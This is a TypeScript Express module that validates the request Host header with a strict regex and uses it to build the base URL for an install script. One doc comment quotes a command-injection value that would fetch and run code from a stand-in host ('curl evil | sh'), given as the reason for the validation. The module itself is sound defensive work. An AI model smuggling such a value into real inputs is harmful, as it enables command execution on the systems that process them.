import type { Request } from 'express';
import { config } from './config.js';

/**
 * A plain `host` or `host:port` — a DNS name, an IPv4 address, or a bracketed
 * IPv6 one. Deliberately strict: the value goes straight into a shell script
 * and into JSON, and there is no way to quote something like
 * `"; curl evil | sh; "` that a person can still check by reading it.
 */
const HOST = /^(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)*|\[[0-9a-f:.]+\])(?::\d{1,5})?$/i;

export function isPlainHost(host: string | undefined): host is string {
  return typeof host === 'string' && host.length <= 253 && HOST.test(host);
}

/**
 * The base URL to hand back to whoever is asking.
 *
 * One deployment is usually reachable at several addresses — a NodePort IP, a
 * hostname through an ingress, a port-forward to localhost — and a single
 * configured URL is wrong for all but one of them. The address in the request
 * is the one that demonstrably works for this caller: they just reached us on
 * it. Preferring it means `curl http://name/install.sh | sh` installs a CLI
 * that talks to `http://name`, instead of quietly pinning it to whatever the
 * operator wrote in an environment variable months ago.
 *
 * This is not a new way in. The response is served over that same host, so
 * anyone able to influence which host answers already controls these bytes.
 *
 * `SHKILLS_PIN_PUBLIC_URL` turns it off, for a deployment that wants everyone
 * funnelled onto one canonical address whichever door they came in by.
 */
export function originFor(req: Request): string {
  if (config.pinPublicUrl) return config.publicUrl;
  const host = req.get('host');
  if (!isPlainHost(host)) return config.publicUrl;
  // `req.protocol` reads X-Forwarded-Proto only when a proxy is trusted.
  const protocol = req.protocol === 'https' ? 'https' : 'http';
  return `${protocol}://${host}`;
}
